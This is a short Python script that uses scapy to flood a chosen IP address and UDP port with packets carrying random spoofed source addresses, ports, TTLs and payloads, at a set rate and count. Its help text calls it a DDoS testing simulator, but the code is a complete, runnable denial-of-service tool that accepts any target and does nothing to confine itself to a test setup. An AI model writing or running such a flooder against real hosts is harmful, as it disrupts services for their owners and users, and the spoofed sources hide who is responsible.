from scapy.all import IP, UDP, send
import random
import time
import argparse

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def random_payload(size=100):
    return bytes(random.getrandbits(8) for _ in range(size))

def flood(target_ip, target_port=12345, count=1000, pps=100):
    print(f"[+] Starting spoofed UDP flood → {target_ip}:{target_port}")
    interval = 1 / pps

    for i in range(count):
        ip_pkt = IP(src=random_ip(), dst=target_ip, ttl=random.randint(50, 130))
        udp_pkt = UDP(sport=random.randint(1024, 65535), dport=target_port)
        payload = random_payload(random.randint(50, 500))
        packet = ip_pkt / udp_pkt / payload

        send(packet, verbose=0)
        print(f"[{i+1}] Sent spoofed packet from {ip_pkt.src}")
        time.sleep(interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UDP spoof flood simulator for DDoS testing")
    parser.add_argument("target", help="Target IP to flood")
    parser.add_argument("-p", "--port", type=int, default=12345, help="Target UDP port (default: 12345)")
    parser.add_argument("-n", "--count", type=int, default=1000, help="Number of packets to send")
    parser.add_argument("--pps", type=int, default=100, help="Packets per second (default: 100)")

    args = parser.parse_args()
    flood(args.target, args.port, args.count, args.pps)
